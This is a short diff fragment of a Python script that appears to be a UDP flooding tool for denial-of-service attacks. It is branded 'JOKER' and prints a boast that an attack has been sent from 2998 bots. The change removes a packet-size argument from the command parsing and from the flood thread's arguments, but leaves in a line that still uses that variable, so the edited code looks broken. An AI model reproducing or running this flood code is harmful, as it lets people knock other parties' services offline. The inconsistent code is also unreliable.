@@ -313,11 +313,11 @@ def main():
 				main()
 			else:
 				try:
-					sinput, host, port, timer, pack = sin.split(" ")
+					sinput, host, port, timer = sin.split(" ")
 					socket.gethostbyname(host)
 					print ("\x1b[1;35m[+] Attack Has Been sent \x1b[1;32m2998 \x1b[1;35mbots [+]".format (host))
 					punch = random._urandom(int(pack))
-					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
+					threading.Thread(target=udpsender, args=(host, port, timer)).start()
 				except ValueError:
 					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
 					main()
